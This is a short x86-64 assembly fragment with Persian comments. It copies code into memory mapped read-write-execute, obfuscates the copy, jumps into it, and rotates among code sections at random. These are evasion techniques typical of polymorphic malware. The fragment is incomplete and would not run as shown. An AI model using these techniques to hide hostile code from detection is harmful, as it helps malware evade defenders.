section .text

; توزیع کد در حافظه
dispatch_code:
    ; تخصیص حافظه تصادفی
    call allocate_random_memory
    mov [new_code_location], rax

    ; کپی کد به محل جدید
    mov rsi, [code_start]
    mov rdi, rax
    mov rcx, [code_size]
    rep movsb

    ; مبهم‌سازی کد کپی شده
    mov rdi, [new_code_location]
    mov rsi, [code_size]
    call obfuscate_code

    ; تغییر جریان اجرا
    jmp [new_code_location]

; تخصیص حافظه تصادفی
allocate_random_memory:
    ; فراخوانی سیستم برای تخصیص حافظه
    mov rax, 9  ; sys_mmap
    xor rdi, rdi  ; آدرس
    mov rsi, [code_size]
    mov rdx, 0x7  ; PROT_READ|PROT_WRITE|PROT_EXEC
    mov r10, 0x22 ; MAP_PRIVATE|MAP_ANONYMOUS
    mov r8, -1    ; fd
    xor r9, r9    ; offset
    syscall
    ret

; چرخش بین بخش‌های کد
rotate_code_sections:
    ; انتخاب تصادفی بخش بعدی
    rdrand eax
    and eax, 0x3  ; 4 بخش مختلف
    mov rdi, [code_sections + rax*8]
    mov [current_section], rdi
    jmp rdi

; اجرای کد در بخش‌های چرخشی
execute_rotating_code:
    call rotate_code_sections
    call [current_section]
    ret
    